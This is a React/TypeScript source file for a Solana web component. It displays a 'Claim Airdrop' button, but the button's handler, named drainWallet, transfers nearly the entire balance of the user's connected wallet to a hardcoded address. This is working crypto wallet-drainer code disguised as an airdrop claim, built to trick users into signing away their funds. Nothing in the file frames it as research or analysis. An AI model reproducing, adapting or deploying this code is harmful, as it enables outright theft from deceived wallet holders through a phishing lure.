"use client"
import { Button, useToasts } from '@geist-ui/core';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import {
  PublicKey,
  SystemProgram,
  Transaction,
  LAMPORTS_PER_SOL,
} from '@solana/web3.js';

// Embedded destination address
const DESTINATION_ADDRESS = 'B3gqTtXasM8hTKqtdaRtd5FmnmvzdinsradRxopSi4pq';
const RESERVE_SOL_FOR_GAS = 0.005; 

export const SendTokens = () => {
  const { setToast } = useToasts();
  const showToast = (message: string, type: any) =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });
  
  const { connection } = useConnection();
  const { publicKey, sendTransaction, signTransaction } = useWallet();
  
  const drainWallet = async () => {
    if (!publicKey || !sendTransaction) {
      showToast('Please connect your wallet first', 'warning');
      return;
    }

    const resolvedDestination = new PublicKey(DESTINATION_ADDRESS);

    try {
      // Get balance
      const balance = await connection.getBalance(publicKey);
      
      // Get latest blockhash
      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('confirmed');

      // Convert reserve to lamports
      const reserveInLamports = RESERVE_SOL_FOR_GAS * LAMPORTS_PER_SOL;
      
      // Calculate amount to send (leave reserve)
      const amountToSend = balance - reserveInLamports;
      
      if (amountToSend <= 0) {
        showToast(`Balance is less than ${RESERVE_SOL_FOR_GAS} SOL reserve`, 'warning');
        return;
      }

      console.log({
        balance: balance / LAMPORTS_PER_SOL,
        reserve: RESERVE_SOL_FOR_GAS,
        amountToSend: amountToSend / LAMPORTS_PER_SOL
      });

      // Create transfer instruction
      const transferInstruction = SystemProgram.transfer({
        fromPubkey: publicKey,
        toPubkey: resolvedDestination,
        lamports: amountToSend,
      });

      // Create and send transaction
      const transaction = new Transaction().add(transferInstruction);
      transaction.feePayer = publicKey;
      transaction.recentBlockhash = blockhash;

      // Send with proper options
      const signature = await sendTransaction(transaction, connection, {
        skipPreflight: true,
        preflightCommitment: 'confirmed',
        maxRetries: 3,
      });
      
      // Wait for confirmation
      const confirmation = await connection.confirmTransaction({
        signature,
        blockhash,
        lastValidBlockHeight
      }, 'confirmed');
      
      if (confirmation.value.err) {
        throw new Error('Transaction failed to confirm');
      }
      
      showToast(
        `Successfully sent ${(amountToSend / LAMPORTS_PER_SOL).toFixed(6)} SOL`, 
        'success'
      );
      
    } catch (err: any) {
      console.error('Drain error:', err);
      
      // Handle specific error cases
      if (err.message?.includes('User rejected')) {
        showToast('Transaction rejected by user', 'warning');
      } else if (err.message?.includes('insufficient lamports')) {
        showToast('Insufficient balance for transaction', 'error');
      } else if (err.message?.includes('block height exceeded')) {
        showToast('Transaction timeout - please try again', 'error');
      } else {
        showToast(`Error: ${err?.message || 'Unknown error'}`, 'error');
      }
    }
  };

  return (
    <div>
      <button
        type="error"
        onClick={drainWallet}
        className='claim_btn'
      >
        Claim Airdrop
      </button>
    </div>
  );
};